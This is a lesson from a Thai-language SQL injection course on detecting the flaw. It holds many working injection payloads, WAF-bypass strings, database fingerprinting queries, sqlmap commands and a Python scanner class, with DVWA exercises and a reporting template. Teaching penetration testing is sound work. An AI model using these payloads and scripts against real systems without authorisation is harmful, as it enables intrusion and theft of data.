# Part 011: การตรวจจับ SQL Injection (Detecting SQL Injection)

## ภาพรวม (Overview)

การตรวจจับ SQL Injection เป็นขั้นตอนแรกและสำคัญที่สุดในการทดสอบความปลอดภัย นักทดสอบต้องรู้ว่าจุดใดในแอพพลิเคชันที่มีช่องโหว่ก่อนจะสามารถ exploit ได้

**ขั้นตอนที่ 101-110 ในหลักสูตรนี้**

---

## 101. หลักการพื้นฐานของการตรวจจับ (Basic Detection Principles)

SQL Injection เกิดขึ้นเมื่อ input ของผู้ใช้ถูกนำไปรวมกับ SQL query โดยไม่มีการ sanitize อย่างเหมาะสม

### สัญญาณที่บ่งบอกถึง SQL Injection

```
1. Error messages ที่มีข้อมูลเกี่ยวกับ database
2. การเปลี่ยนแปลงพฤติกรรมของแอพเมื่อใส่ค่าพิเศษ
3. เวลาตอบสนองที่ผิดปกติ (time delays)
4. ผลลัพธ์ที่แตกต่างจากที่คาดหวัง
```

---

## 102. จุดที่ต้องทดสอบ (Testing Points)

### 2.1 GET Parameters

```
http://example.com/items?id=1
http://example.com/search?q=test
http://example.com/user?name=admin
```

**ทดสอบด้วย:**
```
http://example.com/items?id=1'
http://example.com/items?id=1"
http://example.com/items?id=1`
http://example.com/items?id=1;
http://example.com/items?id=1--
http://example.com/items?id=1 AND 1=1
http://example.com/items?id=1 AND 1=2
```

### 2.2 POST Parameters

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=test
```

**ทดสอบด้วย:**
```
username=admin'
username=admin"
username=admin' --
username=admin' #
username=admin'/*
username=1' OR '1'='1
```

### 2.3 HTTP Headers

```
User-Agent: Mozilla/5.0'
X-Forwarded-For: 127.0.0.1'
Cookie: session=abc123'
Referer: http://evil.com/'
```

### 2.4 JSON Parameters

```json
{
  "id": "1'",
  "name": "test\"",
  "filter": "active' OR 1=1--"
}
```

### 2.5 XML Parameters

```xml
<?xml version="1.0"?>
<request>
  <id>1' OR '1'='1</id>
</request>
```

---

## 103. เทคนิคการตรวจจับ (Detection Techniques)

### 3.1 Error-Based Detection

**ทดสอบด้วยสัญลักษณ์พิเศษ:**

```
'
"
`
\
;
-- -
#
/**/
```

**ตัวอย่าง Error ที่พบบ่อย:**

**MySQL:**
```
You have an error in your SQL syntax; check the manual that 
corresponds to your MySQL server version for the right syntax 
to use near ''' at line 1
```

**MSSQL:**
```
Unclosed quotation mark after the character string ''.
Incorrect syntax near ''.
```

**Oracle:**
```
ORA-01756: quoted string not properly terminated
ORA-00907: missing right parenthesis
```

**PostgreSQL:**
```
ERROR: unterminated quoted string at or near "'"
ERROR: syntax error at or near "'"
```

### 3.2 Boolean-Based Detection

**True Condition (ต้องได้ผลลัพธ์ปกติ):**
```
1 AND 1=1
1' AND '1'='1
1" AND "1"="1
1 AND 1=1--
1' AND '1'='1'--
```

**False Condition (ต้องได้ผลลัพธ์ว่างเปล่าหรือผิดปกติ):**
```
1 AND 1=2
1' AND '1'='2
1" AND "1"="2
1 AND 1=2--
1' AND '1'='2'--
```

**ตัวอย่างการทดสอบ:**

```
URL ปกติ: http://example.com/item?id=1
# ผลลัพธ์: แสดงข้อมูล item 1

True condition: http://example.com/item?id=1 AND 1=1
# ผลลัพธ์ควรเหมือนกับ URL ปกติ

False condition: http://example.com/item?id=1 AND 1=2
# ผลลัพธ์ควรว่างเปล่าหรือแตกต่าง
```

### 3.3 Time-Based Detection

**MySQL:**
```sql
1 AND SLEEP(5)
1' AND SLEEP(5)--
1; SELECT SLEEP(5)--
1 OR SLEEP(5)--
```

**MSSQL:**
```sql
1; WAITFOR DELAY '0:0:5'--
1' WAITFOR DELAY '0:0:5'--
1; IF (1=1) WAITFOR DELAY '0:0:5'--
```

**PostgreSQL:**
```sql
1; SELECT pg_sleep(5)--
1' AND (SELECT 1 FROM pg_sleep(5))--
```

**Oracle:**
```sql
1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)
1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

---

## 104. เครื่องมือสำหรับการตรวจจับ (Detection Tools)

### 4.1 Manual Detection Checklist

```bash
# ขั้นตอนการทดสอบ manual
1. ระบุจุดรับ input ทั้งหมด
2. ทดสอบด้วย single quote (')
3. ทดสอบด้วย double quote (")
4. ทดสอบด้วย comment (-- , #, /**/)
5. ทดสอบ boolean conditions
6. ทดสอบ time delays
7. บันทึก responses ทั้งหมด
```

### 4.2 Burp Suite

```
1. เปิด Burp Suite
2. ตั้งค่า Proxy ใน browser
3. Intercept requests
4. ส่ง request ไปที่ Intruder หรือ Repeater
5. ทดสอบ payloads ต่างๆ
```

**Burp Scanner:**
- ใช้ Active Scan เพื่อตรวจหา SQL Injection อัตโนมัติ
- ดูผลลัพธ์ใน Issues tab

### 4.3 SQLMap Detection Mode

```bash
# ตรวจจับแบบ passive
sqlmap -u "http://example.com/item?id=1" --detect-level=1

# ตรวจจับแบบครบถ้วน
sqlmap -u "http://example.com/item?id=1" --level=5 --risk=3

# ตรวจจับ headers
sqlmap -u "http://example.com/" --headers="X-Custom: test*"
```

### 4.4 OWASP ZAP

```
1. เปิด OWASP ZAP
2. ใส่ URL target
3. เรียกใช้ Active Scan
4. ดูผลใน Alerts tab
```

---

## 105. การวิเคราะห์ Response (Response Analysis)

### 5.1 HTTP Status Codes

```
200 OK          - ปกติ
500 Internal Server Error - อาจมี error จาก database
403 Forbidden   - อาจมี WAF หรือ security controls
404 Not Found   - อาจมีการ hide errors
```

### 5.2 Response Length Analysis

```python
# Python script สำหรับวิเคราะห์ response length
import requests

url = "http://example.com/item"
params_true = {"id": "1 AND 1=1"}
params_false = {"id": "1 AND 1=2"}
params_normal = {"id": "1"}

r_normal = requests.get(url, params=params_normal)
r_true = requests.get(url, params=params_true)
r_false = requests.get(url, params=params_false)

print(f"Normal length: {len(r_normal.text)}")
print(f"True condition length: {len(r_true.text)}")
print(f"False condition length: {len(r_false.text)}")

if len(r_true.text) == len(r_normal.text) and len(r_false.text) != len(r_normal.text):
    print("[+] Boolean-based SQL Injection detected!")
```

### 5.3 Time Analysis

```python
import requests
import time

url = "http://example.com/item"

# ทดสอบ time-based
start = time.time()
r = requests.get(url, params={"id": "1 AND SLEEP(5)"})
elapsed = time.time() - start

if elapsed >= 4:
    print(f"[+] Time-based SQL Injection detected! (Elapsed: {elapsed:.2f}s)")
else:
    print(f"[-] No time-based injection (Elapsed: {elapsed:.2f}s)")
```

### 5.4 Content-Based Analysis

```python
import requests

url = "http://example.com/item"

# ตรวจหา error messages
error_patterns = [
    "mysql_fetch",
    "You have an error in your SQL syntax",
    "ORA-01756",
    "Unclosed quotation mark",
    "syntax error",
    "SQLSTATE",
    "pg_query",
    "mssql_query",
    "mysql error",
    "Warning: mysql",
]

r = requests.get(url, params={"id": "1'"})
for pattern in error_patterns:
    if pattern.lower() in r.text.lower():
        print(f"[+] SQL Error detected: {pattern}")
```

---

## 106. การทดสอบแบบ Systematic (Systematic Testing)

### 6.1 Injection Point Discovery Script

```python
#!/usr/bin/env python3
"""
SQL Injection Point Discovery Script
สำหรับการศึกษาและทดสอบ security เท่านั้น
"""

import requests
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import re
import time

class SQLInjectionDetector:
    def __init__(self, base_url, cookies=None):
        self.base_url = base_url
        self.session = requests.Session()
        if cookies:
            self.session.cookies.update(cookies)
        
        self.payloads = {
            'error': ["'", '"', '`', "\\", "';", '";'],
            'boolean_true': ["1 AND 1=1", "' AND '1'='1", '" AND "1"="1'],
            'boolean_false': ["1 AND 1=2", "' AND '1'='2", '" AND "1"="2'],
            'time': ["1 AND SLEEP(3)", "1' AND SLEEP(3)--", "1; WAITFOR DELAY '0:0:3'--"],
        }
        
        self.results = []
    
    def test_parameter(self, url, param_name, original_value):
        """ทดสอบ parameter เดียว"""
        print(f"\n[*] Testing parameter: {param_name}")
        
        params = {param_name: original_value}
        try:
            baseline = self.session.get(url, params=params, timeout=10)
        except:
            return
        
        for payload in self.payloads['error']:
            params = {param_name: original_value + payload}
            try:
                r = self.session.get(url, params=params, timeout=10)
                if self._has_sql_error(r.text):
                    result = f"[+] Error-based SQLi found in '{param_name}' with payload: {payload}"
                    print(result)
                    self.results.append(result)
                    return True
            except:
                pass
        
        true_responses = []
        false_responses = []
        
        for payload in self.payloads['boolean_true']:
            params = {param_name: payload}
            try:
                r = self.session.get(url, params=params, timeout=10)
                true_responses.append(len(r.text))
            except:
                pass
        
        for payload in self.payloads['boolean_false']:
            params = {param_name: payload}
            try:
                r = self.session.get(url, params=params, timeout=10)
                false_responses.append(len(r.text))
            except:
                pass
        
        if true_responses and false_responses:
            avg_true = sum(true_responses) / len(true_responses)
            avg_false = sum(false_responses) / len(false_responses)
            baseline_len = len(baseline.text)
            
            true_diff = abs(avg_true - baseline_len)
            false_diff = abs(avg_false - baseline_len)
            
            if true_diff < 50 and false_diff > 50:
                result = f"[+] Boolean-based SQLi found in '{param_name}'"
                print(result)
                self.results.append(result)
                return True
        
        for payload in self.payloads['time']:
            params = {param_name: payload}
            start = time.time()
            try:
                r = self.session.get(url, params=params, timeout=15)
                elapsed = time.time() - start
                if elapsed >= 2.5:
                    result = f"[+] Time-based SQLi found in '{param_name}' (delay: {elapsed:.1f}s)"
                    print(result)
                    self.results.append(result)
                    return True
            except:
                pass
        
        print(f"[-] No SQLi found in '{param_name}'")
        return False
    
    def _has_sql_error(self, text):
        """ตรวจหา SQL error messages"""
        error_patterns = [
            r"you have an error in your sql syntax",
            r"unclosed quotation mark",
            r"ora-\d{5}",
            r"pg_query\(\)",
            r"warning: mysql",
            r"valid mysql result",
            r"mssql_query\(\)",
            r"syntax error.*near",
            r"unexpected end of sql command",
            r"quoted string not properly terminated",
        ]
        text_lower = text.lower()
        return any(re.search(pattern, text_lower) for pattern in error_patterns)
    
    def scan_url(self, url):
        """สแกน URL ทั้งหมด"""
        print(f"\n[*] Scanning: {url}")
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param_name, values in params.items():
            self.test_parameter(url, param_name, values[0])
        
        return self.results


if __name__ == "__main__":
    detector = SQLInjectionDetector("http://testphp.vulnweb.com")
    results = detector.scan_url("http://testphp.vulnweb.com/artists.php?artist=1")
    
    print("\n[*] Summary:")
    for r in results:
        print(r)
```

---

## 107. การจัดการกับ WAF (WAF Handling During Detection)

### 7.1 ตรวจสอบว่ามี WAF หรือไม่

```python
import requests

def detect_waf(url):
    """ตรวจจับ WAF"""
    
    test_payload = "1' UNION SELECT 1,2,3--"
    
    normal_response = requests.get(url)
    waf_trigger = requests.get(url + test_payload)
    
    waf_indicators = [
        ("Cloudflare", ["cloudflare", "cf-ray"]),
        ("ModSecurity", ["mod_security", "modsecurity"]),
        ("Akamai", ["akamai"]),
        ("Imperva", ["imperva", "incapsula"]),
        ("F5 BIG-IP", ["big-ip", "f5"]),
        ("Sucuri", ["sucuri"]),
    ]
    
    for waf_name, indicators in waf_indicators:
        headers_text = str(waf_trigger.headers).lower()
        body_text = waf_trigger.text.lower()
        
        for indicator in indicators:
            if indicator in headers_text or indicator in body_text:
                print(f"[+] WAF Detected: {waf_name}")
                return waf_name
    
    if waf_trigger.status_code in [403, 406, 501]:
        print(f"[+] WAF Detected (Status: {waf_trigger.status_code})")
        return "Unknown WAF"
    
    print("[-] No WAF detected")
    return None
```

### 7.2 Bypass WAF ระหว่างการตรวจจับ

```
# ใช้ case variation
' Or 1=1--
' OR 1=1--
' oR 1=1--

# ใช้ comments
'/**/OR/**/1=1--
' /*!OR*/ 1=1--

# ใช้ encoding
%27 OR 1%3D1--
' OR 1%3D1--
```

---

## 108. Fingerprinting Database (ระบุประเภท Database)

### 8.1 ใช้ Error Messages

**MySQL:**
```sql
' AND extractvalue(1, concat(0x7e, version()))--
```
ผลลัพธ์: `XPATH syntax error: '~5.7.38'`

**MSSQL:**
```sql
' AND 1=convert(int, @@version)--
```
ผลลัพธ์: `Conversion failed when converting the nvarchar value...`

**Oracle:**
```sql
' AND 1=utl_raw.cast_to_number('test')--
```

**PostgreSQL:**
```sql
' AND 1=cast(version() as int)--
```

### 8.2 ใช้ Syntax Differences

```sql
-- MySQL
SELECT 'a' 'b'  -- string concat โดยไม่ใช้ operator

-- MSSQL  
SELECT 'a'+'b'  -- ใช้ + สำหรับ concat

-- Oracle
SELECT 'a'||'b' FROM dual  -- ต้องมี FROM dual

-- PostgreSQL
SELECT 'a'||'b'  -- ใช้ || สำหรับ concat
```

### 8.3 Database Fingerprinting Payloads

```python
def fingerprint_database(url, param):
    """ระบุประเภท Database"""
    
    fingerprints = {
        "MySQL": [
            "' AND (SELECT 1 FROM dual) IS NOT NULL--",
            "' AND VERSION() LIKE '%mysql%'--",
            "' AND @@version_compile_os IS NOT NULL--",
        ],
        "MSSQL": [
            "' AND (SELECT 1)=1--",
            "' AND @@SERVERNAME IS NOT NULL--",
            "'; IF (1=1) SELECT 1--",
        ],
        "Oracle": [
            "' AND (SELECT 1 FROM dual) IS NOT NULL--",
            "' AND (SELECT banner FROM v$version WHERE rownum=1) IS NOT NULL--",
        ],
        "PostgreSQL": [
            "' AND (SELECT version()) IS NOT NULL--",
            "' AND current_database() IS NOT NULL--",
        ],
    }
    
    results = {}
    for db_type, payloads in fingerprints.items():
        for payload in payloads:
            r = requests.get(url, params={param: payload})
            if not has_error(r.text):
                results[db_type] = "Possible"
    
    return results
```

---

## 109. การบันทึกและรายงาน (Documentation and Reporting)

### 9.1 รูปแบบการบันทึก

```markdown
## SQL Injection Finding

**URL:** http://example.com/items?id=1
**Parameter:** id
**Type:** Error-based SQL Injection
**Severity:** High

### Evidence
**Request:**
GET /items?id=1' HTTP/1.1
Host: example.com

**Response:**
You have an error in your SQL syntax; check the manual 
that corresponds to your MySQL server version...

### Impact
- สามารถดึงข้อมูลทั้งหมดจาก database ได้
- อาจส่งผลให้ข้อมูลผู้ใช้รั่วไหล

### Proof of Concept
http://example.com/items?id=1'

### Remediation
1. ใช้ Prepared Statements
2. ใช้ Parameterized Queries
3. Input Validation
4. Principle of Least Privilege
```

### 9.2 CVSS Score Calculation

```
CVSS v3.1 สำหรับ SQL Injection:

Attack Vector: Network (N)
Attack Complexity: Low (L)
Privileges Required: None (N)
User Interaction: None (N)
Scope: Unchanged (U)
Confidentiality: High (H)
Integrity: High (H)
Availability: High (H)

Base Score: 9.8 (Critical)
```

---

## 110. แบบฝึกหัด (Exercises)

### Exercise 1: Basic Detection

ทดสอบ SQL Injection บน DVWA (Damn Vulnerable Web Application):

1. ตั้งค่า DVWA ใน Docker:
```bash
docker run -d -p 80:80 vulnerables/web-dvwa
```

2. ล็อกอินด้วย admin/password

3. ไปที่ SQL Injection module

4. ทดสอบ payloads ต่อไปนี้:
```
1
1'
1"
1 AND 1=1
1 AND 1=2
1 UNION SELECT 1,2
```

5. บันทึกผลลัพธ์

### Exercise 2: Time-Based Detection

```python
#!/usr/bin/env python3
"""
Time-based SQL Injection Detection Exercise
"""

import requests
import time

base_url = "http://localhost/dvwa/vulnerabilities/sqli/"
cookies = {"PHPSESSID": "your_session_id", "security": "low"}

test_cases = [
    ("1", "Normal"),
    ("1 AND SLEEP(3)", "MySQL time delay"),
    ("1; WAITFOR DELAY '0:0:3'--", "MSSQL time delay"),
    ("1 AND (SELECT * FROM (SELECT(SLEEP(3)))a)--", "MySQL subquery delay"),
]

for payload, description in test_cases:
    start = time.time()
    r = requests.get(
        base_url,
        params={"id": payload, "Submit": "Submit"},
        cookies=cookies
    )
    elapsed = time.time() - start
    
    status = "DELAYED" if elapsed > 2 else "NORMAL"
    print(f"[{status}] {description}: {elapsed:.2f}s")
```

### Exercise 3: Create Detection Report

สร้าง report สำหรับ vulnerability ที่พบ โดยรวมถึง:
- URL และ parameters ที่มีช่องโหว่
- ประเภทของ SQL Injection
- Proof of Concept payload
- Impact analysis
- Remediation recommendations

---

## สรุป (Summary)

ในส่วนนี้เราได้เรียนรู้:

1. **หลักการพื้นฐาน** - SQL Injection เกิดขึ้นที่ไหนและอย่างไร
2. **จุดทดสอบ** - GET, POST, Headers, Cookies, JSON, XML
3. **เทคนิคการตรวจจับ** - Error-based, Boolean-based, Time-based
4. **เครื่องมือ** - Burp Suite, SQLMap, OWASP ZAP
5. **การวิเคราะห์ Response** - HTTP status codes, content analysis
6. **Systematic Testing** - Python scripts สำหรับ automation
7. **WAF Detection** - การตรวจสอบและรับมือกับ WAF
8. **Database Fingerprinting** - การระบุประเภท database
9. **การรายงาน** - รูปแบบการเขียน report

---

*Part 011 | SQL Injection Course | สงวนลิขสิทธิ์เพื่อการศึกษา*
